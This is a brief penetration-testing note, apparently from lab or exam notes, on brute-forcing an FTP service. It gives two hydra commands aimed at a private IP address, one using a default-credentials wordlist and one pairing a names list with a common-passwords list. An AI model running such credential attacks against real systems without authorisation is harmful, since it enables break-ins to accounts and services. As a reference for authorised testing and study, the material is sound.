
## Bruteforcing

Default Credentials.

```
hydra -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.198.93
```

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt ftp://192.168.198.93
```